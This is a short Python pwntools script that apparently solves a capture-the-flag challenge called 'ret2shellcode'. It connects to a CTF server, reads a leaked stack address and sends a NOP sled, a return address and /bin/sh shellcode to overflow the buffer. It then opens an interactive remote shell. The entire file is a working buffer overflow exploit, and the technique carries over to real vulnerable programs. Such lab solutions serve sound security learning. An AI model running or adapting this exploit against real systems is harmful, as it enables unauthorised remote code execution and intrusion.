#!/usr/bin/env python

from pwn import *
context.binary = binary = './ret2shellcode'

shellcode = asm(shellcraft.sh())

p = remote('nc.ctf.unitedctf.ca', 4001)
rest = int(p.recv().split(b'smash me: ')[1][0:10], 16)
print(rest)

payload = flat(
    asm('nop') * 140,
    rest,
    asm('nop') * 16,
    shellcode
)
print(payload)
p.sendline(payload)
p.interactive()